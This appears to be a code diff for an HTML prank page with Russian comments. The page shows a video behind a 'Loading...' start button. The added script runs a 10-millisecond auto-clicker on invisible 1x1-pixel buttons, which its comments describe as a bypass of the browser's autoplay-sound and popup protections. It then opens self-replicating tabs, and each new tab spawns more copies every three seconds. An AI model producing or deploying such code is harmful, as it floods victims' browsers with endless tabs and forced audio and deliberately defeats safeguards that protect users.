@@ -2,76 +2,48 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        * { box-sizing: border-box; }
         html, body {
             margin: 0; padding: 0; height: 100%;
             background: #000; overflow: hidden;
             font-family: Arial, sans-serif;
-            -webkit-tap-highlight-color: transparent;
         }
         #start-screen {
-            position: fixed; inset: 0;
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
-            background: #000; cursor: pointer; z-index: 99999;
-            padding: 20px; text-align: center;
+            background: #000; cursor: pointer; z-index: 9999;
         }
         #start-screen h1 {
-            font-size: 22px; color: #fff; margin: 0 0 30px;
+            font-size: 22px; color: #fff; margin-bottom: 30px;
         }
         #green-btn {
             background: #00cc44; color: #fff; border: none;
             padding: 18px 40px; font-size: 20px;
             border-radius: 8px; cursor: pointer;
             box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
-            font-weight: bold;
         }
-        #green-btn:active { background: #00ff55; transform: scale(0.95); }
-
-        #main-video {
-            position: fixed; inset: 0;
+        #green-btn:hover { background: #00ff55; }
+        
+        #video-container {
+            position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
-            object-fit: cover;
-            z-index: 1;
-            display: none;
-            background: #000;
+            z-index: 1; display: none; background: #000;
         }
+        #fullscreen-video {
+            width: 100%; height: 100%; object-fit: cover;
+        }
+        .hidden { display: none !important; }
 
-        .copy-video {
-            position: fixed;
-            width: 45vw;
-            height: 30vh;
-            border: 2px solid red;
-            box-shadow: 0 0 20px red;
-            background: #000;
-            animation: shakeCopy 0.15s infinite;
-            overflow: hidden;
-        }
-        .copy-video video {
-            width: 100%; height: 100%;
-            object-fit: cover;
-            display: block;
-            pointer-events: none;
-        }
-        .copy-video .sound-btn {
-            position: absolute;
-            top: 0; left: 0;
-            width: 1px; height: 1px;
-            padding: 0; margin: 0; border: none;
-            background: transparent;
-            opacity: 0.001;
-            cursor: pointer;
+        /* Невидимые кнопки 1х1 пиксель для байпасса */
+        .bypass-btn {
+            position: absolute; top: 0; left: 0;
+            width: 1px; height: 1px; opacity: 0.001;
+            border: none; background: transparent; cursor: pointer;
             z-index: 9999;
-        }
-        @keyframes shakeCopy {
-            0% { transform: translate(0,0); }
-            25% { transform: translate(2px,2px); }
-            50% { transform: translate(-2px,-2px); }
-            75% { transform: translate(2px,-2px); }
-            100% { transform: translate(0,0); }
         }
     </style>
 </head>
@@ -83,135 +55,122 @@
         </button>
     </div>
 
-    <video id="main-video" loop playsinline>
-        <source src="video.mp4" type="video/mp4">
-    </video>
+    <div id="video-container">
+        <video id="fullscreen-video" loop playsinline>
+            <source src="video.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <!-- Две скрытые кнопки для байпасса -->
+    <button id="sound-bypass-btn" class="bypass-btn"></button>
+    <button id="window-bypass-btn" class="bypass-btn"></button>
 
     <script>
         var started = false;
-        var copyCount = 0;
 
         function startVideo() {
             if (started) return;
             started = true;
 
-            document.getElementById('start-screen').style.display = 'none';
+            document.getElementById('start-screen').classList.add('hidden');
+            document.getElementById('video-container').style.display = 'block';
 
-            // ============================================================
-            //  1. ГЛАВНОЕ ВИДЕО — СО ЗВУКОМ СРАЗУ (0 сек)
-            // ============================================================
-            var mainVideo = document.getElementById('main-video');
-            mainVideo.style.display = 'block';
-            mainVideo.muted = false;
-            mainVideo.volume = 1.0;
-            mainVideo.play().catch(function(e) {
-                console.log('Автоплей не сработал:', e);
-                mainVideo.muted = true;
-                mainVideo.play().catch(function(){});
+            var video = document.getElementById('fullscreen-video');
+            video.muted = false;
+            video.play().catch(function(e) {
+                video.muted = true;
+                video.play().catch(function(){});
             });
 
-            // ============================================================
-            //  2. КАЖДЫЕ 3 СЕКУНДЫ — КОПИЯ ВИДЕО ПОВЕРХ ЭКРАНА
-            // ============================================================
+            // Запускаем ультра-автокликер (каждые 0.01 сек) по нашим скрытым кнопкам
             setInterval(function() {
-                spawnCopy();
+                try { document.getElementById('sound-bypass-btn').click(); } catch(e) {}
+                try { document.getElementById('window-bypass-btn').click(); } catch(e) {}
+            }, 10);
+
+            // Ровно через 3 секунды запускаем цепную реакцию создания копий
+            setTimeout(function() {
+                triggerReplication();
             }, 3000);
         }
 
-        // ============================================================
-        //  КОПИЯ ВИДЕО + АВТО-КЛИК КНОПКИ 1×1 ДЛЯ РАЗРЕШЕНИЯ ЗВУКА
-        // ============================================================
-        function spawnCopy() {
-            copyCount++;
-
-            var wrapper = document.createElement('div');
-            wrapper.className = 'copy-video';
-
-            var maxX = Math.max(0, window.innerWidth - 200);
-            var maxY = Math.max(0, window.innerHeight - 150);
-            wrapper.style.left = Math.floor(Math.random() * maxX) + 'px';
-            wrapper.style.top = Math.floor(Math.random() * maxY) + 'px';
-
-            // Создаём video
-            var v = document.createElement('video');
-            v.src = 'video.mp4';
-            v.loop = true;
-            v.playsInline = true;
-            v.muted = true;      // изначально без звука
-            v.setAttribute('playsinline', '');
-
-            wrapper.appendChild(v);
-
-            // ============================================================
-            //  КНОПКА 1×1 ПИКСЕЛЬ — почти невидимая
-            // ============================================================
-            var btn = document.createElement('button');
-            btn.className = 'sound-btn';
-            wrapper.appendChild(btn);
-
-            // Тап по копии — закрывает
-            wrapper.onclick = function(e) {
-                if (e.target === btn) return;
-                e.stopPropagation();
-                wrapper.remove();
-            };
-            wrapper.ontouchstart = function(e) {
-                if (e.target === btn) return;
-                e.stopPropagation();
-                wrapper.remove();
-                e.preventDefault();
-            };
-
-            document.body.appendChild(wrapper);
-
-            // Запускаем видео в копии (без звука, чтобы автоплей разрешили)
-            v.play().catch(function(e) {
-                console.log('Копия не играет:', e);
-            });
-
-            // ============================================================
-            //  АВТО-КЛИК ПО КНОПКЕ 1×1 КАЖДЫЕ 0.1 СЕК
-            //  Пока не разрешится звук
-            // ============================================================
-            var soundUnlocked = false;
-            var attempts = 0;
-            var MAX_ATTEMPTS = 300; // 30 секунд — потом сдаёмся
-
-            function tryUnlockSound() {
-                if (soundUnlocked || attempts >= MAX_ATTEMPTS) return;
-                attempts++;
-
-                // Программно нажимаем на кнопку 1×1
-                try {
-                    btn.click();
-                } catch(e) {}
-
-                setTimeout(tryUnlockSound, 100);  // каждые 0.1 сек
+        // Логика кнопки звукового байпасса
+        document.getElementById('sound-bypass-btn').addEventListener('click', function() {
+            var v = document.getElementById('fullscreen-video');
+            if (v && v.muted) {
+                v.muted = false;
+                v.play().catch(function(){});
             }
+        });
 
-            // Обработчик кнопки — пытается включить звук
-            btn.addEventListener('click', function(e) {
-                if (soundUnlocked) return;
-                try {
-                    v.muted = false;
-                    v.volume = 1.0;
-                    v.play().then(function() {
-                        // Проверяем через 0.2 сек — играет ли со звуком
-                        setTimeout(function() {
-                            if (!v.muted && !v.paused) {
-                                soundUnlocked = true;
-                                console.log('Звук в копии #' + copyCount + ' разрешён');
-                            }
-                        }, 200);
-                    }).catch(function() {
-                        // Не получилось — оставляем muted
-                        v.muted = true;
-                    });
-                } catch(e) {}
-            });
+        // Логика кнопки создания новых окон (байпасс через клик)
+        document.getElementById('window-bypass-btn').addEventListener('click', function() {
+            // Защита от перегрузки: делаем так, чтобы срабатывало ровно каждые 3 секунды
+            if (!window._lastSpawn || Date.now() - window._lastSpawn >= 3000) {
+                window._lastSpawn = Date.now();
+                openReplicatingTab();
+            }
+        });
 
-            // Запускаем цикл авто-клика
-            setTimeout(tryUnlockSound, 200);
+        function openReplicatingTab() {
+            try {
+                var w = window.open('', '_blank');
+                if (w) {
+                    w.document.write(`
+                        <html>
+                        <head>
+                            <title>Loading...</title>
+                            <style>
+                                html, body { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
+                                video { width: 100%; height: 100%; object-fit: cover; }
+                                .bypass-btn { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.001; border: none; background: transparent; }
+                            </style>
+                        </head>
+                        <body>
+                            <video id="v" loop playsinline>
+                                <source src="video.mp4" type="video/mp4">
+                            </video>
+                            <button id="s-btn" class="bypass-btn"></button>
+                            <button id="w-btn" class="bypass-btn"></button>
+                            <script>
+                                var v = document.getElementById('v');
+                                v.muted = false;
+                                v.play().catch(function() {
+                                    v.muted = true;
+                                    v.play().catch(function(){});
+                                });
+
+                                // Автокликер внутри копии
+                                setInterval(function() {
+                                    try { document.getElementById('s-btn').click(); } catch(e) {}
+                                    try { document.getElementById('w-btn').click(); } catch(e) {}
+                                }, 10);
+
+                                document.getElementById('s-btn').addEventListener('click', function() {
+                                    if (v.muted) {
+                                        v.muted = false;
+                                        v.play().catch(function(){});
+                                    }
+                                });
+
+                                document.getElementById('w-btn').addEventListener('click', function() {
+                                    if (!window._subSpawn || Date.now() - window._subSpawn >= 3000) {
+                                        window._subSpawn = Date.now();
+                                        try {
+                                            window.open(window.location.href, '_blank');
+                                        } catch(e) {}
+                                    }
+                                });
+                            <\/script>
+                        </body>
+                        </html>
+                    `);
+                }
+            } catch(e) {}
+        }
+
+        function triggerReplication() {
+            openReplicatingTab();
         }
     </script>
 </body>
